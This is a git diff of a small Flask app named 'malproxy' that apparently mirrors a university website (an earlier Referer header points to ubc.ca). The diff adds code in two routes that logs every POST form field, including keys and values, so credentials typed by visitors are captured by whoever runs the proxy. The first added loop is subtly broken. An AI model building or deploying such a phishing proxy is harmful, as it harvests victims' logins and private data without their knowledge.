@@ -14,13 +14,12 @@ def malproxy(path):
     parsed = urlparse(WEBSITE)
     if(not parsed.scheme):
         WEBSITE = f'https://{WEBSITE}'
+    if(request.method == 'POST'):
+        print(request.form)
+        for pair in request.form:
+            print(f'{pair[0]}: {pair[1]}')
     r = requests.request(request.method, f'{WEBSITE}{path}')
     return r.content
-
-@app.route('/undergraduate-students/', methods=['GET'])
-def proxyund():
-    return('hello')
-
 
 @app.route('/<path:path>', methods=['POST', 'GET'])
 def proxycont(path):
@@ -33,9 +32,11 @@ def proxycont(path):
     # print(f'{WEBSITE}/{path}')
 
     s = requests.Session()
-    s.headers.update({'Referer':'https://www.ubc.ca/'})
-    s.headers.update({':path':f'{path}'})
-    print(s.headers)
+    s.headers.update({'User-Agent':request.headers.get('User-Agent')})
+    if(request.method == 'POST'):
+        print(request.form)
+        for key in request.form:
+            print(f'{key}: {request.form[key]}')
     r = requests.request(request.method, f'{WEBSITE}/{path}')
     return r.content
 
